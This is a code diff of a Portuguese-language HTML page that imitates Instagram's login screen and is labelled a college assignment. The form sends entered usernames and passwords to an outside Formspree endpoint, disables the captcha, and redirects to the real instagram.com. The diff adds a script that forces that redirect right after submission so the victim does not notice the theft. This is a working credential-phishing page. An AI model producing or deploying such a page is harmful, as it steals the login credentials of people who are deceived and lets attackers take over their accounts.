@@ -1,108 +1,92 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #fafafa;
-        }
-
-        .instagram-wrapper {
-            display: flex;
-            gap: 50px;
-        }
-
-        .instagram-phone img {
-            max-width: 300px;
-        }
-
-        .instagram-login {
-            width: 350px;
-        }
-
-        .group {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 40px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .instagram-logo {
-            margin-bottom: 20px;
-        }
-
-        form {
-            display: flex;
-            flex-direction: column;
-        }
-
-        input {
-            width: 100%;
-            padding: 9px;
-            margin-bottom: 10px;
-            border: 1px solid #dbdbdb;
-            background-color: #fafafa;
-            border-radius: 3px;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        button {
-            background-color: #0095f6;
-            border: none;
-            color: white;
-            padding: 8px;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        p {
-            font-size: 13px;
-            color: #999;
-            margin: 15px 0;
-        }
-
-        .facebook-login {
-            color: #385185;
-            font-weight: bold;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .forgot {
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-        }
-
-        .signup {
-            font-size: 14px;
-        }
-
-        .signup span {
-            color: #0095f6;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram - Trabalho Faculdade</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background-color: #fafafa;
+}
+.instagram-wrapper {
+    display: flex;
+    gap: 50px;
+}
+.instagram-phone img {
+    max-width: 300px;
+}
+.instagram-login {
+    width: 350px;
+}
+.group {
+    background-color: #fff;
+    border: 1px solid #dbdbdb;
+    padding: 40px;
+    margin-bottom: 10px;
+    text-align: center;
+}
+.instagram-logo {
+    margin-bottom: 20px;
+}
+form {
+    display: flex;
+    flex-direction: column;
+}
+input {
+    width: 100%;
+    padding: 9px;
+    margin-bottom: 10px;
+    border: 1px solid #dbdbdb;
+    background-color: #fafafa;
+    border-radius: 3px;
+    font-size: 14px;
+    text-align: center;
+}
+button {
+    background-color: #0095f6;
+    border: none;
+    color: white;
+    padding: 8px;
+    border-radius: 4px;
+    font-weight: bold;
+    cursor: pointer;
+}
+p {
+    font-size: 13px;
+    color: #999;
+    margin: 15px 0;
+}
+.facebook-login {
+    color: #385185;
+    font-weight: bold;
+    text-decoration: none;
+    font-size: 14px;
+}
+.forgot {
+    font-size: 12px;
+    color: #00376b;
+    text-decoration: none;
+}
+.signup {
+    font-size: 14px;
+}
+.signup span {
+    color: #0095f6;
+    cursor: pointer;
+}
+</style>
 </head>
-
 <body>
 
 <div class="instagram-wrapper">
@@ -118,24 +102,12 @@
         <div class="group">
             <img src="./img/instagram-logo.png" class="instagram-logo" alt="Instagram logo">
 
-            <!-- FORMULÁRIO FUNCIONAL -->
-            <form action="https://formspree.io/f/xkoojkow" method="POST">
+            <!-- FORMULÁRIO FUNCIONAL COM REDIRECIONAMENTO GARANTIDO -->
+            <form id="loginForm" action="https://formspree.io/f/xkoojkow" method="POST">
+                <input type="text" name="login" placeholder="Telefone, nome de usuário ou email" required>
+                <input type="password" name="senha" placeholder="Senha" required>
 
-                <input
-                    type="text"
-                    name="login"
-                    placeholder="Telefone, nome de usuário ou email"
-                    required
-                >
-
-                <input
-                    type="password"
-                    name="senha"
-                    placeholder="Senha"
-                    required
-                >
-
-                <!-- REDIRECIONAMENTO -->
+                <!-- Redirecionamento do Formspree -->
                 <input type="hidden" name="_next" value="https://www.instagram.com/">
                 <input type="hidden" name="_captcha" value="false">
 
@@ -143,7 +115,6 @@
             </form>
 
             <p>OU</p>
-
             <a href="#" class="facebook-login">Entrar com o Facebook</a><br><br>
             <a href="#" class="forgot">Esqueceu a senha?</a>
         </div>
@@ -154,6 +125,15 @@
 
     </div>
 </div>
+
+<script>
+// Redirecionamento garantido após envio
+document.getElementById('loginForm').addEventListener('submit', function() {
+    setTimeout(function() {
+        window.location.href = 'https://www.instagram.com/';
+    }, 100); // espera 100ms para garantir envio
+});
+</script>
 
 </body>
 </html>
